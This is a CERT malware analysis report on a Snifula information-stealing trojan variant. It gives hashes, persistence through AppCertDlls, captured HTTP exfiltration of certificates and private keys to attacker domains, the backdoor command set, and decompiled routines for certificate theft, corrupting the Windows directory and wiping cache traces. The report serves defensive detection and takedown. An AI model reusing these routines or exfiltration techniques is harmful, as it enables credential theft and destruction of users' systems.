TLP:WHITE

Malware analysis report of a Backdoor.Snifula variant
CIRCL - Computer Incident Response Center Luxembourg and National CERT of Luxembourg
41, avenue de la gare, 1611 Luxembourg, Luxembourg⇤
(Dated: 2012-07-25 Initial version)
(12-07-27 Updated domain intel)
(12-09-12 Updated take-down)
(13-05-29 Public release (TLP:WHITE))

Abstract
Trojan horses and particularly information stealing malware are a prevalent risk in information security.
According to Symantec, Snifula is a family of information stealing trojan horses known since 2006 and
the developers enhanced it over the years up to the current version (see Appendix for a history). The
actual version is - like its predecessors - not spread very widely, but has some unusual and underestimated
capabilities that go farther than stealing passwords or files from an infected computer. A main ability
of the malware is the X.509 certificate stealing functionality, which is in its maliciousness beyond the
usual information stealing scenarios and generally only considered being a theoretical attack in most
organizations. This report shows that the threat is real and being used in targeted attacks - and that
the attackers can reach this goal by using documented Windows functions only.

⇤

Electronic address: info@circl.lu; URL: http://www.circl.lu/

1

Contents

I. Introduction

3

II. Examined Files

3

III. Characteristics of the installation process

6

IV. Post-installation and runtime analysis

8

A. Behavior

8

1. Anti-analysis

8

2. Pipe communication for Inter Process Communication

9

3. Registry interaction

9

4. Network behavior

9

5. Diﬀerent actions performed on the network:

10

V. Static analysis

12

A. Snifula Command analysis

12

B. Details about specific commands:

13

1. Certificate stealing

13

2. Screenshot taking

14

3. Cookie, History and Internet cache stealing

15

4. Write executable modules

15

5. KILL - Corrupt Windows

15

6. SOCKS server

15

VI. Observations

16

A. General observations

16

B. Observations regarding hosts / IP addresses / registrars

16

VII. Appendix

19

A. History of Snifula

19

B. VirusTotal results

19

1. Detections for file 2a7.exe (as of 2012-07-22)

19

2. Detections for file dump_00E30000.bin

20

2

3. Detections for file dump_006D0000.bin

20

4. Detections for file ctfmreg.dll (as of 2012-07-22)

20

5. Detections for file ctfmreg64.dll

21

C. Interesting code parts

21

1. Corrupt Windows

21

2. Delete URL from URL Cache

21

D. Exports

I.

22

1. ctfmreg.dll

22

2. dump_00E30000.bin

23

E. Involved hosts and AS numbers

23

F. Related domain information

27

G. Take-down

28

1. Registered domains

28

2. IP addresses

28

INTRODUCTION

CIRCL has been involved in an international call to support a foreign CERT with the analysis
of this particular malware. We have only been handed over an MD5 of the malware, which we
were able to locate in and download from a malware database. During the work with this file,
several files have been produced during diﬀerent types of analysis. This report aims to give an
overview of the entire chain, from installation to operation of the malware.

II.

EXAMINED FILES

1. File: 2a7.exe
(a) Origin: VirusTotal
(b) Function: Dropper
(c) Checksums
i. MD5: eaa5e4f26028c41ba3935a4ac455892c
ii. SHA1: 049db2d7030bf7563974a2c25671aef046cabf99
3

iii. SHA-256: 2a72d04024a37413d260c53433309f62e922736fae3b2e321f0cdfcb2927ccf7
2. File: dump_00E30000.bin
(a) Origin: Dumped from a segment of 2a7.exe during dynamic analysis
(b) Function: DLL, identified to be the decrypted ctfmreg.dll (see 4.)
(c) Checksums
i. MD5: a6bf4ae086b8d28612de4bc0d7ec4abe
ii. SHA1: 2b6b4fbc77553425b00ee3135e2e83386ebd797f
iii. SHA-256: e352a6e73b52096da9ef78e09b29f9b4b969264a0cb682a4dc9da976d260d0bd
3. File: dump_006D0000.bin
(a) Origin: Dumped from a segment of 2a7.exe during dynamic analysis
(b) Function: Installer
(c) Checksums
i. MD5: d819facd7c980b01bf44ea7efbf6af42
ii. SHA1: abfe4e74b345669a0fcd8a34bﬀ9c9a0a7bc9c44
iii. SHA-256: f6cc42d577c25192282b4eddﬀ3efebc8efefa4056b6939e14af17fd3e365722
4. File: ctfmreg.dll
(a) Origin: File extracted while running dump_006D0000.bin
(b) Function: Actual encrypted malware installed and running on a 32 bit Windows system
(c) Checksums
i. MD5: f9005fd7eb85a81f2f9b1474bba61be0
ii. SHA1: 89196b0ed3189e8571924144e57aa867f72164bd
iii. SHA-256: 67d8a87c1361b9b3a150f1dcf05082f874ed316fde3aa5311b8b7ﬀ93bbd09f2
5. File: ctfmreg64.dll
(a) Origin: File extracted while running dump_006D0000.bin (with binary instrumentation)
4

(b) Function: Actual encrypted malware installed and running on a 64 bit Windows system
(c) Checksums
i. MD5: edb1c6fa185dc818e9cf1d107974561a
ii. SHA1: 383b76f23ac1d469a59a85af1a8d9c1d3f932e2f
iii. SHA-256: 4384ec85f5d83e4d8e474e4899098787c513e0a42ﬀ1047a28f5244448dce7f7
6. File: [8 decimals digits from GetTickCount()].bat (example: 41082546.bat)
(a) Origin: File dropped while running dump_006D0000.bin
(b) Function: Batch file to delete files after installation
(c) Checksums for 41082546.bat
i. MD5: d226a657b279c5fc0a892748230a56ﬀ
ii. SHA1: fa7e4fb6d6de3c4769001cbfce0a00ba02ef28a5
iii. SHA-256: 9dae2767b8e3499d37418a75ddd04d457c7ec8d6c8f312ee109c95a8a97e7761

5

III.

CHARACTERISTICS OF THE INSTALLATION PROCESS

2a7.exe

Memory (decrypted)
dump_006D0000.bin

dump_00E30000.bin
decrypted and encrypted
version of same file

ctfmreg64.dll

ctfmreg.dll

Filesystem (encrypted)

• File 2a7.exe (dropper) runs dump_006D0000.bin, which drops - based on the underlying

Windows environment - either the file ctfmreg.dll on a 32 bit system or ctfmreg64.dll on
a 64 bit system into the directory c:\windows\system32\ and decrypts and loads is into
memory (which was dumped as dump_00E30000.bin)

• The file is registered in
HKLM\ System \ C u r r e n t C o n t r o l S e t \ C o n t r o l \ S e s s i o n Manager \ A p p C e r t D l l s \

on 32 bit Windows environments with the key:value pair
mmcpapir : c : \ windows \ s y s t e m 3 2 \ c t f m r e g . d l l

or with the following pair on 64 bit Windows environments
mmcpapir : c : \ windows \ s y s t e m 3 2 \ c t f m r e g 6 4 . d l l

• Initial startup is triggered via ShellExecute on
r u n d l l 3 2 . exe ctfmreg . d l l , C r e a t e P r o c e s s N o t i f y

Interestingly, analysis of the file ctfmreg.dll shows a list of 46 exported functions, from
which solely this CreateProcessNotify is left after the internal decryption process. A possible
intention of the malware author(s) might be to make the library look unsuspicious. On the
6

other side the list of exports in this particular, unique combination qualifies pretty good as
a detection signature. The false positive rate has not been evaluated, though.
• The file 41082546.bat (example filename) is started last. The filename is based on GetTickCount as input for %lu.bat where %lu is a format string. It removes the installation file
and itself.
• The following pseudo code illustrates the process:

1
2

DWORD _ _ s t d c a l l main ( c o n s t CHAR ⇤ c m d L i n e )
{

3

HMODULE_1 = G e t M o d u l e H a n d l e A ( 0 ) ;

4

HMODULE_0 = G e t M o d u l e H a n d l e A ( 0 ) ;

5

WindowsVersion = GetVersion ( ) ;

6

current_process_id = GetCurrentProcessId ( ) ;

7

s h e l l _ e x e c u t e ( cmdLine ) ;

8

pMem = 0 ; memset(& v13 ,

9

if

10

{

0 , 0 x18 u ) ;

( c a l l _ Q u e r y I n f o r m a t i o n T o k e n (&pMem) )
if ...

11
12

if

13

{

( write_ctfmreg_dll () )

14

E v e n t A t t r i b u t e s . nLength = 1 2 ;

15

EventAttributes . bInheritHandle = 0;

16

if ...

17

HEVENT = C r e a t e E v e n t A (& E v e n t A t t r i b u t e s , TRUE, FALSE , lpName ) ;

18

if

19

{

20

( HEVENT )
S e t E v e n t (HEVENT ) ;

21

S l e e p (2000 u ) ;

22

R e s e t E v e n t (HEVENT ) ;

23

C l o s e H a n d l e (HEVENT ) ;

24

HRSRC32 = F i n d R e s o u r c e A ( 0 , " CLIENT32 " , 0xA ) ;

25

if

( HRSRC32 )

27

if

( check_wow64 ( c u r r e n t _ p r o c e s s _ i d ) )

28

{

26

i n j e c t _ d e c r y p t e d _ r e s o u r c e _ i n t o _ b r o w s e r ( HRSRC32 , 0 x10 ) ;

29

HRSRC64 = F i n d R e s o u r c e A ( 0 , " CLIENT64 " , 0xA ) ;

30

if

31

( HRSRC64 )
i n j e c t _ d e c r y p t e d _ r e s o u r c e _ i n t o _ b r o w s e r ( HRSRC64 , 0 x18 ) ;

32

}

33

HTIMER = C r e a t e W a i t a b l e T i m e r A (& E v e n t A t t r i b u t e s , TRUE, lpTimerName ) ;

34

if ...

35

LocalFree ( EventAttributes . lpSecurityDescriptor ) ;

36

ret = 0;

37

}

38

}

39

}

40

create_write_execute_batch_file ( ) ;

41

if

(

r e t ==

42
return

43
44

1 )

ret = GetLastError ( ) ;
ret ;

}

7

IV.

POST-INSTALLATION AND RUNTIME ANALYSIS
A.

Behavior

1. Anti-analysis

After the installation as described in section III., a ctfmreg.dll is loaded into explorer.exe. It
takes care that ctfmreg.dll is loaded into every process that is started on the infected computer
and by doing so it prevents basic investigation methods by not allowing various programs to start,
like Sysinternals procmon.exe.
"Procmon was unable to allocate suﬃcient memory to run. Try increasing the size
of your page file."

It also takes care that only Internet Explorer or Mozilla Firefox are used as a browser. Other
browsers, particularly the following, are exited during startup:
• Opera
• Safari
• Chrome
8

2. Pipe communication for Inter Process Communication

At this point in time, a communication pipe is established on the system. The pipe is part of
the Inter Process Communication schema of the malware and used to execute commands. The
pipe is built with this format string:
\ \ . \ p i p e \{%08x %04x %04x %04x %08x%04x }

And was constant during our investigation. Nevertheless, there is an initialization factor that
might change. In our tests the pipe’s name was the following:
{370 a98c4 cd53 7296 38 fd e c 8 1 2 a 3 7 f e 5 b }

This pipe can be enumerated as a host signature, e.g. with Sysinternals pipelist.

3. Registry interaction

The following Registry keys are set up in
HKEY_CURRENT_USER\ S o f t w a r e \AppDataLow \{ dd2706e2 58d9 ec64 3673 c a 5 7 d 8 1 d 8 c a 1 }

• key ’k1’ with a 4 byte value reflecting the user id, which is created using the Windows API
function CoCreateGuid()

• key ’k2’ with a 4 byte value which doesn’t seem to be used within this component
• key ’Version’ with the version number (currently 0x0c = 12)
• key ’s1’ with a 4 byte value which is created/used when the SOCKS functionality is turned
on

4. Network behavior

Only if a browser is opened, the network functions become active.
Immediately when a browser is opened, the following hosts are queried with HTTP POSTs:
• wednesltr.com.tw
• masmitnd.com.tw
9

• financepfrro.com.tw
Two backup IP addresses are also in the binary, but not seen to be queried:
• 200.46.204.8
• 95.143.198.47
5. Diﬀerent actions performed on the network:

1. Upload of X.509 certificates: A function opens the certificate store, enumerates and exports
all certificates and also the private keys, encrypts them with the password ’password’,
compresses the file and sends it over the network:
POST h t t p : / / w e d n e s l t r . com . tw / uda
C o n t e n t Type :
User

Agent :

Host :

m u l t i p a r t / form

data ;

b o u n d a r y=

M o z i l l a / 5 . 0 ( Windows NT 5 . 1 ;

1d 7 2 4 8 c 1 d 7 2 4 8 c 1 d 7 2 4 8 c

r v : 1 1 . 0 ) Gecko / 2 0 1 0 0 1 0 1

F i r e f o x /11.0

w e d n e s l t r . com . tw

Content

L e n g t h : 2 4 63 3 5

C o n n e c t i o n : keep

alive

M u l t i p a r t form
Form d a t a :

upload_file :

PK . . . . . . . . . . . @ . J . $ ( . . . . . . . . . . . AuthRoot . pfxUT
. . . A .O. A .O. A .O . 7 . . . 0 . . . . . . . 0 . . . . . ? ⇤ . H . .
. . . . . . . . . . . . . 0 . . . . 0 . . . . . ? ⇤ . H..

. . . . . . . . 0 . . . . . . . 0 . . . . . ? ⇤ . H..

[...]

2. Upload of basic environment information:
POST h t t p : / / w e d n e s l t r . com . tw / uda
C o n t e n t Type :
User

Agent :

Host :

m u l t i p a r t / form

data ;

b o u n d a r y=

M o z i l l a / 5 . 0 ( Windows NT 5 . 1 ;

1d 7 2 4 8 c 1 d 7 2 4 8 c 1 d 7 2 4 8 c

r v : 1 1 . 0 ) Gecko / 2 0 1 0 0 1 0 1

F i r e f o x /11.0

w e d n e s l t r . com . tw

Content

L e n g t h : 641

C o n n e c t i o n : keep

alive

M u l t i p a r t form
Form d a t a :
OS :

upload_file :

M i c r o s o f t Windows XP P r o f e s s i o n a l

S e r v i c e Pack 3 ( b u i l d :

ARCH : x 8 6 32 b i t
USER : Admin
u s e r _ i d : 153958625
v e r s i o n _ i d : 12
sys : 1

(a) The server simply replies with ’ok!’
3. Upload of basic software information:

10

2600)

POST h t t p : / / masmitnd . com . tw / p i n g
C o n t e n t Type :
User

Agent :

a p p l i c a t i o n / x www form

urlencoded

M o z i l l a / 5 . 0 ( Windows NT 5 . 1 ;

r v : 1 1 . 0 ) Gecko / 2 0 1 0 0 1 0 1

F i r e f o x /11.0

H o s t : masmitnd . com . tw
Content

L e n g t h : 64

C o n n e c t i o n : keep

alive

URLEncoded f o r m
user_id :

153958625

v e r s i o n _ i d : 12
socks : 0
b u i l d : 32940
c r c : 00000000

(a) The server returns a file which appears to be a configuration file, gzip compressed
and encrypted. This file also contains new instructions
4. Ask for command:
POST h t t p : / / w e d n e s l t r . com . tw /ucommd
C o n t e n t Type :

a p p l i c a t i o n / x www form

Gecko / 2 0 1 0 0 1 0 1

F i r e f o x /11.0

Host :

u r l e n c o d e d User

Agent :

M o z i l l a / 5 . 0 ( Windows NT 5 . 1 ;

rv :11.0)

w e d n e s l t r . com . tw

Content

L e n g t h : 64

C o n n e c t i o n : keep

alive

URLEncoded f o r m
u s e r _ i d : 153958625
v e r s i o n _ i d : 12
socks : 0
b u i l d : 32940
c r c : 00000000

(a) This HTTP POST request is executed regularly in a separate thread. It asks for a new
command from the server and the response is evaluated and executed on the infected
system. A complete list of possible commands is shown in the following chapter.

11

V.

STATIC ANALYSIS
A.

Snifula Command analysis

External commands received via HTTP can be:
• EXE (261)
• DL_EXE (262)
• DL_EXE_ST (263)
• CLEAR_COOK (267)
• VER (-)
• REBOOT (259)
• KILL (264)
• GET_CERTS (265)
• GET_COOKIES (266)
• SOCKS_START (271)
• SOCKS_STOP (270)
• GET_LOG (-)
These external commands are translated into internal commands. The control is set up to be
performed via a named pipe. The number in brackets is the corresponding internal command sent
via the named pipe to the receiving function. The malware uses the browser API to communicate
with the servers. Here it uses the functionality of DeleteUrlCacheEntry() to delete the used URLs
from the browser cache to delete traces.
• 271: SOCKS start
• 270: SOCKS stop
• 258: Find files (threaded)
12

• 259: Reboot Windows
• 260: Write file
• 261: Write executable module and execute
• 262: Write executable module
• 263: Write executable module and make it autostart
• 264: Corrupt windows directory and reboot computer
• 265: Start Certificate stealing thread
• 266: Start Cookie stealing thread
• 267: Copy Cookies, History and Internet Cache files
• 268: Write log
• 269: Read log
Some of the internal commands are not mapped to external commands or they are part of an
external command.

B.

Details about specific commands:

1. Certificate stealing

The certificates of the certificate stores (shown in the following listing) are exported, including
their private key. This is done in the function export_certificates:
P F X E x p o r t C e r t S t o r e E x (HCERTSTORE, &pPFX , L" p a s s w o r d " , 0 , EXPORT_PRIVATE_KEYS)

This exports the given certificate store, including the private keys, encrypting it with the
password ’password’.
1

DWORD _ _ s t d c a l l

2

{

3

c e r t s _ t h r e a d ( i n t a1 )

temp = m a k e _ t e m p _ f i l e ( ) ;

4

if

5

{

( temp )

6

D e l e t e F i l e A ( temp ) ;

7

if

( C r e a t e D i r e c t o r y A ( temp ,

0) )

13

8

{

9

e x p o r t _ c e r t i f i c a t e s ( "My" , temp ) ;

10

e x p o r t _ c e r t i f i c a t e s ( " A d d r e s s B o o k " , temp ) ;

11

e x p o r t _ c e r t i f i c a t e s ( " AuthRoot " , temp ) ;

12

e x p o r t _ c e r t i f i c a t e s ( " C e r t i f i c a t e A u t h o r i t y " , temp ) ;

13

e x p o r t _ c e r t i f i c a t e s ( " D i s a l l o w e d " , temp ) ;

14

e x p o r t _ c e r t i f i c a t e s ( " Root " , temp ) ;

15

e x p o r t _ c e r t i f i c a t e s ( " T r u s t e d P e o p l e " , temp ) ;

16

e x p o r t _ c e r t i f i c a t e s ( " T r u s t e d P u b l i s h e r " , temp ) ;

17

e r r o r = c r e a t e _ f i l e _ a n d _ a d d _ t o _ s e n d _ l i s t ( temp ,

18

f i l e _ o p e r a t i o n s ( temp ,

19

1);

1);

R e m o v e D i r e c t o r y A ( temp ) ;

20

}

21

else

22

{

23

error = GetLastError ( ) ;

24

}

25

H e a p F r e e ( hHeap ,

26

0 , temp ) ;

}

27

else

28

{

29

e r r o r = 1006;

30

}

31

p F i l e = H e a p A l l o c ( hHeap ,

32

w s p r i n t f A ( p F i l e , " C e r t s ended wi t h

33

size_file = lstrlenA ( pFile );

34

pipe_process_command ( s i z e _ f i l e ,

35

H e a p F r e e ( hHeap ,

36
37

1,

return

0,

0 , 0 x400u ) ;
s t a t u s %u \ n " ,

268 ,

error );

pFile );

pFile );

error ;

}

The certificate files are archived and compressed into a temporary file of the format [16 hex
characters].tmp, they are written at
C : \ Documents and S e t t i n g s \<USER NAME>\ L o c a l S e t t i n g s \Temp

Subsequently, another thread collects and uploads these files periodically, started within this
function:
create_thread_collect_upload_files ()

2. Screenshot taking

The malware contains functionality to take screenshots from the infected computer. In contrast to the outlined control schema via HTTP embedded commands from section V.a., the
screenshot taking command is embedded within the encrypted file returned to the /ping command
(see section IV.a.5.2). A screenshot is taken when the file contains the command “SCREENSHOT”. The screenshot file is then uploaded.

14

3. Cookie, History and Internet cache stealing

The malware collects all browser history and cache files from the browser folder and collects
cookie files from Internet Explorer, Firefox and Macromedia Flash Player. The files are assembled
and uploaded.

4. Write executable modules

The malware can retrieve an additional executable file and either
• save it to <Temp Path>\[filename].exe where filename is a decimal unsigned long representation of the result of GetTickCount()

• save and run it
• save and make it autostart via
HKCU\ S o f t w a r e \\ M i c r o s o f t \\ Windows \\ C u r r e n t V e r s i o n \\Run

5. KILL - Corrupt Windows

When the malware receives the ’KILL’ command, the inode of the Windows directory is
overwritten with the malware module and a reboot is triggered. Overwriting the windows directory
renders the Windows installation unusable.

6. SOCKS server

The malware is able to create a reverse connection to a server on the internet, basically able
to act as a proxy server for the attacker. This functionality can be turned on dynamically on
request.

15

VI.

OBSERVATIONS
A.

General observations

This is a list of general observations regarding the capabilities of this malware
• Internet connections are proxy capable. Even username and passwords are read from the
current browser configuration

• The combination of History stealing (targets), Cookies (authentication information), X.509

certificates (strong authentication) and acting as a proxy server for the attacker is considered a high risk and a serious threat to the confidentiality of information that are usually
heavily protected and only accessible from defined networks.

• The malware uses Threads, Windows Events, Asynchronous Procedure Calls and Windows

Pipe communication and appears to be well-written in terms of design and implementation
including error handling.

• The malware writer(s) left a string of his build environment within the binary, that could
be used for signatures:

C : \ tmp\NRM 27_01_12\PDB\ c l i e n t _ x 3 2 . pdb

• The encrypted file returned following the /ping command needs a deeper investigation,
because it could contain more functionalities that are not covered in this analysis and
could be done in a related future work.

B.

Observations regarding hosts / IP addresses / registrars

The attacker has left a few traces by registering domains and using IP addresses. The network
registry information is included in the Appendix and does not give any specific hints about the
attacker, except that he has or had access to diﬀerent hosts at IP addresses at various places in
the world:
• CAT Telecom Public Company Ltd, Thailand
• Hurricane Electric , Inc ., USA
16

• AltNet, IP Kolobov Aleksandr Grigorievich, Ukraine
• HUB.ORG, Panama
• SERVERCONNECT, Sweden
The domain registry information includes some interesting information that is worth to be mentioned here.
The domains included in the binary
• wednesltr.com.tw
• masmitnd.com.tw
• financepfrro.com.tw
share common elements: they are all registered the same day by the same “person” at the same
registrar:
Registrant :
A s t e r Ltd
Lu Bing h s i a n

a s t e r @ g m a i l . com

+86.8457434354
+86.8457434354
No . 8 , J i a X i n g Road , A n t e s Economic & T e c h n o l o g i c a l D e v e l o p m e n t Area , Y a n t a i , Shandong , C h i n a
YanTai , ShanDong
CN
A d m i n i s t r a t i v e Contact :
Lu Bing h s i a n

a s t e r @ g m a i l . com

+86.8457434354
+86.8457434354
Technical Contact :
Lu Bing h s i a n

a s t e r @ g m a i l . com

+86.8457434354
+86.8457434354
R e c o r d e x p i r e s on 2013 03 06 (YYYY MM DD)
R e c o r d c r e a t e d on 2012 03 06 (YYYY MM DD)
Domain s e r v e r s i n

listed

order :

n s 3 . cnmsn . com
n s 4 . cnmsn . com
R e g i s t r a t i o n S e r v i c e P r o v i d e r : WebCC L td .

17

Interestingly, there are around 40 domains listed at domaintools.com which are all registered
by the email address ’aster@gmail.com’. It would be no surprise if those domains are also used
for malicious activities. These domains are included in the Appendix.

18

VII.

APPENDIX

A.

History of Snifula

• 2006 - Infostealer.Snifula.A: http://www.symantec.com/security_response/writeup.jsp?docid=2006072610-2145-99&tabid=2

• 2006 - Infostealer.Snifula.B: http://www.symantec.com/security_response/writeup.jsp?docid=2006110710-2700-99&tabid=2

• 2007 - Infostealer.Snifula.C: http://www.symantec.com/security_response/writeup.jsp?docid=2007051005-4518-99&tabid=2

• 2012 - Backdoor.Snifula.D: http://www.symantec.com/security_response/writeup.jsp?docid=2012062203-0431-99&tabid=2

B.

VirusTotal results

1. Detections for file 2a7.exe (as of 2012-07-22)
nProtect :

Trojan . Generic .7361643

McAfee :

A r t e m i s ! EAA5E4F26028

K7AntiVirus :

Trojan

TheHacker :

Trojan / Dropper . I n j e c t o r . d i s x

VirusBuster :

T r o j a n . DR . I n j e c t o r ! wZtuXJUqECU

NOD32 :

a v a r i a n t o f Win32 / K r y p t i k . ACYX

F Prot :

W32/ T r o j a n 2 .NQMQ

Symantec :

WS. R e p u t a t i o n . 1

Norman :

W32/ I n j e c t o r . ACVI

TrendMicro H o u s e C a l l :

TROJ_SPNR. 1 6 C I 1 2

Avast :

Win32 : Dropper KLC [ Drp ]

Kaspersky :

T r o j a n D r o p p e r . Win32 . I n j e c t o r . d i s x

BitDefender :

Trojan . Generic .7361643

Emsisoft :

T r o j a n D r o p p e r . Win32 . I n j e c t o r ! IK

Comodo :

UnclassifiedMalware

F Secure :

Trojan . Generic .7361643

VIPRE :

T r o j a n . Win32 . G e n e r i c . pak ! c o b r a

AntiVir :

TR/ Drop . I n j e c t o r . d i s x

TrendMicro :

TROJ_SPNR. 1 6 C I 1 2

McAfee GW E d i t i o n :

A r t e m i s ! EAA5E4F26028

Sophos :

T r o j /FakeAV FGJ

19

GData :

Trojan . Generic .7361643

Commtouch :

W32/ T r o j a n 2 .NQMQ

AhnLab V3 :

D r o p p e r / Win32 . I n j e c t o r

VBA32 :

TrojanDropper . I n j e c t o r . d i s x

Ikarus :

T r o j a n D r o p p e r . Win32 . I n j e c t o r

Fortinet :

W32/ I n j e c t o r . DISX ! t r

AVG :

D r o p p e r . G e n e r i c 5 .BODG

Panda :

Generic Trojan

Scanned : 2012 04 19 1 2 : 2 9 : 1 0

42 s c a n s

29 d e t e c t i o n s ( 6 9 . 0 % )

2. Detections for file dump_00E30000.bin

No detections (as of 2012-07-22)

3. Detections for file dump_006D0000.bin

No detections (as of 2012-07-22)

4. Detections for file ctfmreg.dll (as of 2012-07-22)
McAfee :

G e n e r i c PWS. y ! d2z

K7AntiVirus :

Riskware

TheHacker :

Trojan / Kryptik . wrl

VirusBuster :

T r o j a n . K r y p t i k ! WjiRK5FHsos

NOD32 :

a v a r i a n t o f Win32 / K r y p t i k .WRL

F Prot :

W32/ Agent . IV . gen ! E l d o r a d o

Norman :

W32/ S u s p i c i o u s _ G e n 4 .VNDC

Avast :

Win32 : K r y p t i k IAQ [ T r j ]

Kaspersky :

B a c k d o o r . Win32 . P a p r a s . f g i

Comodo :

UnclassifiedMalware

VIPRE :

T r o j a n . Win32 . G e n e r i c !BT

AntiVir :

TR/ Spy . U r s n i f . 8 9

McAfee GW E d i t i o n :

G e n e r i c PWS. y ! d2z

Emsisoft :

T r o j a n Spy . Win32 . U r s n i f ! IK

Microsoft :

T r o j a n S p y : Win32 / U r s n i f

GData :

Win32 : K r y p t i k IAQ

Commtouch :

W32/ Agent . IV . gen ! E l d o r a d o

AhnLab V3 :

B a c k d o o r / Win32 . P a p r a s

Ikarus :

T r o j a n Spy . Win32 . U r s n i f

Fortinet :

W32/FakeAV . FGJ ! t r

AVG :

C r y p t . ARZV

Scanned : 2012 05 03 1 6 : 2 5 : 1 1

40 s c a n s

21 d e t e c t i o n s ( 5 2 . 0 % )

20

5. Detections for file ctfmreg64.dll

No detections (as of 2012-07-22)

C.

Interesting code parts

1. Corrupt Windows
1
2

CHAR ⇤ _ _ u s e r c a l l c o r r u p t _ w i n d o w s <eax >(DWORD t h i s <e c x >, i n t a2<e d i >)
{

3

CHAR ⇤ w i n d o w s _ d i r e c t o r y ; // eax@1 MAPDST

4

LPSTR p S t r ; // eax@2

5

c o n s t CHAR ⇤ d i r _ w i t h o u t _ d r i v e _ l e t t e r ; // e s i @ 2

6

HANDLE h F i l e W i n d o w s D i r e c t o r y ; // e s i @ 2

7

HMODULE h I n s t a n c e ; // eax@3

8

BOOL s u c c e s s ; // ebp@3

9

v o i d ⇤ v9 ; // ecx@3

10

DWORD N u m b e r O f B y t e s W r i t t e n ; // [ s p+0h ]

11

NumberOfBytesWritten = t h i s ;

12

w i n d o w s _ d i r e c t o r y = H e a p A l l o c ( hHeap ,

13

if

14

{

[ bp 4h ] @1

0 , MAX_PATH) ;

( windows_directory )

15

G e t W i n d o w s D i r e c t o r y A ( w i n d o w s _ d i r e c t o r y , MAX_PATH) ;

16

p Str = StrChrA ( windows_directory ,

17

pStr [ 1 ] = 0;

’: ’);

18

dir_without_drive_letter = pStr + 2;

19

w s p r i n t f A ( p S t r + 2 , "\\\\.\\% s " , w i n d o w s _ d i r e c t o r y ) ; / /

20

h F i l e W i n d o w s D i r e c t o r y = C r e a t e F i l e A ( d i r _ w i t h o u t _ d r i v e _ l e t t e r , RW_ALL, 3u ,

21

if

22

{

( h F i l e W i n d o w s D i r e c t o r y !=

h I n s t a n c e = GetModuleHandleA ( 0 ) ;

24

success = WriteFile ( hFileWindowsDirectory ,

25

CloseHandle ( hFileWindowsDirectory ) ;

26

if

(

success

0);

h I n s t a n c e , 0 x10000u , &N u m b e r O f B y t e s W r i t t e n ,

0);

// G e t M o d u l e H a n d l e ( 0 )

)

}

29

w i n d o w s _ d i r e c t o r y = H e a p F r e e ( hHeap ,

30

0 , windows_directory ) ;

}

31
32

0,

r e b o o t _ w i n d o w s ( v9 ) ;

28

return

windows_directory ;

}

2. Delete URL from URL Cache
1

signed

2

{

int

_ _ s t d c a l l delete_URL_from_UrlCache ( LPCSTR URL)

3

HLOCAL hMem ; // e d i @ 1

4

HANDLE U r l C a c h e E n t r y ; // ebx@2

5

signed

6

DWORD c b C a c h e E n t r y I n f o ; // [ s p+Ch ]

int

7

ret = 0;

r e t ; // [ s p+8h ]

[ bp 8h ] @1

8

cbCacheEntryInfo = 4096;

9

hMem = L o c a l A l l o c ( 0 x40u , 0 x 1 0 0 0 u ) ;

10

if

11

{

0 , OPEN_EXISTING ,

1 )

23

27

’ \ \ . \ windows ’

[ bp 4h ] @1

( hMem )

12

U r l C a c h e E n t r y = F i n d F i r s t U r l C a c h e E n t r y A ( 0 , hMem , &c b C a c h e E n t r y I n f o ) ;

13

if

( UrlCacheEntry )

21

gives a hInstance

14

{

15

ret = 1;

16

do

17

{
if

18

(

19

S t r S t r I A ( ⇤ (hMem + 1 ) , URL) )

D e l e t e U r l C a c h e E n t r y ( ⇤ (hMem + 1 ) ) ;

20

cbCacheEntryInfo = 4096;

21

}

22

while

23

FindCloseUrlCache ( UrlCacheEntry ) ;

24

}

25

L o c a l F r e e (hMem ) ;

26

}
return

27
28

( F i n d N e x t U r l C a c h e E n t r y A ( U r l C a c h e E n t r y , hMem , &c b C a c h e E n t r y I n f o )

ret ;

}

D.

Exports

1. ctfmreg.dll
Flags

: 00000000

Time stamp

: Tue Mar 13 2 0 : 3 2 : 4 6 2012

Version

:

DLL name

:

client . dll

:

1.

Ordinals
# of

base

Addresses :

# o f Names

:

0.0
(00000001)

4 6 . (0000002E)
4 6 . (0000002E)

1 . 00011F9D C r e a t e P r o c e s s N o t i f y
2 . 0 0 0 0 5 4 B3 RefreshAppRegEnum
3 . 0 0 0 0 2 8 C6 D e s t r o y O v e r S t r u c t P o o l
4 . 0 0 0 0 2 2 3A S e r v e r G e t A p p l i c a t i o n T y p e
5 . 0 0 0 0 6 6DC F r e e O v e r S t r u c t
6 . 0 0 0 0 4 5 1A OpenAppRegEnum
7 . 00006AA2 G e t C o m p u t e r O b j e c t
8 . 00005 D02 C a l l B e g i n n i n g
9 . 00002 C55 R e s e t C a l l C o u n t
1 0 . 0 0 0 0 5 8 3B O p e n C o m p o n e n t L i b r a r y O n S t r e a m E x
1 1 . 0 0 0 0 6 1 B1 R e i n i t O v e r S t r u c t
1 2 . 00001881 SetActionLogModeSz
1 3 . 00006965

SetSilent

1 4 . 00005 A12 O p e n C o m p o n e n t L i b r a r y E x
1 5 . 00008AC4 M o n i t o r H a n d l e
1 6 . 0 0 0 0 1 1 0 4 OpenComponentLibraryOnMemEx
1 7 . 00005DBD R e g i s t e r A p p l i c a t i o n
1 8 . 0 0 0 0 3 0DB G e t G l o b a l B a b y J I T E n a b l e d
1 9 . 00006F0D SetUnimodemTimer
2 0 . 0 0 0 0 1 2 5B S e t A c t i o n L o g M o d e
2 1 . 0 0 0 0 7 4 B3 E x e c u t e A c t i o n
2 2 . 00006B9B S t o p M o n i t o r i n g H a n d l e
2 3 . 0 0 0 0 2 6 A4 S e t S e t u p S a v e
2 4 . 00008 E5B AppRegEnum
2 5 . 00008 FC1 C r e a t e O v e r S t r u c t P o o l
2 6 . 0 0 0 0 6 0 9 7 CreateUnimodemTimer
2 7 . 00006 B06 S e t u p S a v e
2 8 . 0 0 0 0 4 3 5D S t a r t M o n i t o r T h r e a d
2 9 . 0 0 0 0 6 1 0 4 DowngradeAPL
3 0 . 00005BDB Q u e r y A p p l i c a t i o n
3 1 . 0 0 0 0 3 9 9 1 UpdateFromAppChange
3 2 . 0 0 0 0 7 2BC UpdateFromComponentChange
3 3 . 0 0 0 0 5 5BE G e t S i m p l e T a b l e D i s p e n s e r

22

);

3 4 . 00005DB5 S y n c D e v i c e I o C o n t r o l
3 5 . 00008609 U m P l a t f o r m D e i n i t i a l i z e
3 6 . 0 0 0 0 2 7 5A CloseAppRegEnum
3 7 . 0 0 0 0 1 0D4 U n r e g i s t e r A p p l i c a t i o n
3 8 . 00006937 StopMonitorThread
3 9 . 00007 D16 S e t S e t u p O p e n
